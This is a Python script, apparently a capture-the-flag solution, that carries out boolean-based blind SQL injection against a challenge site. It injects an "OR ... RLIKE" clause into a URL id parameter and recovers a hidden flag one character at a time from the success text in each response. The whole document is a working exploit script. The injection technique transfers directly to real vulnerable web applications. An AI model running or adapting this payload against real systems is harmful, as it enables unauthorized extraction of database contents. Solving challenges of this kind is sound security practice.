import requests
import string
import urllib.parse

BASE_URL = "https://the-needle.chall.wwctf.com/?id="

found = ""

chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#%&,-:;<=>@_`~"

def build_regex_pattern(char):
    return rf"wwf\\{{{found}{char}.*\\}}"

def build_url(regex_pattern):
    query_raw = f"a' OR information RLIKE '{regex_pattern}"
    id_param = urllib.parse.quote_plus(query_raw)
    return f"{BASE_URL}{id_param}"

def find_flag():
    session = requests.Session()

    for c in chars:
        pattern = build_regex_pattern(c)
        url = build_url(pattern)
        print(f"Trying character '{c}' with pattern '{pattern}'")
        print(f"URL: {url}")

        try:
            response = session.get(url, timeout=10)
            if response.status_code != 200:
                print(f"Warning: Received status code {response.status_code}")
                continue

            if "We found it" in response.text:
                print(f"\nSuccess! Found matching character: '{c}'")
                print(f"URL triggered success:\n{url}")
                return c

        except requests.RequestException as e:
            print(f"Request failed for character '{c}': {e}")

    print("No matching character found.")
    return None

if __name__ == "__main__":
    while True:
        found_char = find_flag()
        if found_char is None:
            break
        else:
            found = found + found_char
    if found_char:
        print(f"Found matching character: {found_char}")
    else:
        print("No matching character found in the search space.")